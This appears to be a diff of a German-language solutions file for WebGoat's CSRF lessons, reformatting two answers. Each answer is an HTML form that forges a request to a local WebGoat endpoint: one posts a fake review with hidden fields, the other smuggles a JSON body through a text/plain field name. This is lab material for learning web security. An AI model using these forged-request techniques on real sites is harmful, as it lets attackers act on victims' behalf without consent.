@@ -14,14 +14,16 @@ Geben Sie hier Ihre Lösungen zu CSRF ein.
 
 2)
 
-<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://localhost:8080/WebGoat/csrf/review">
+<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST"
+    name="review-form" successcallback="" action="http://localhost:8080/WebGoat/csrf/review">
     <input type="hidden" name="reviewText" type="text" value="Oh no!">
     <input type="hidden" name="stars" type="text" value="5">
     <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
     <input type="submit" name="submit" value="Submit review">
 </form>
 
-3) <form name="feedback" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST">
+3) <form name="feedback" enctype="text/plain" action="http://localhost:8080
+/WebGoat/csrf/feedback/message" method="POST">
   <input type="hidden" name='{"name":"vernjan","email":"foo@bar.com","subject":"service","message":"Hello' value='"}'>
   <input type="submit">
 </form>
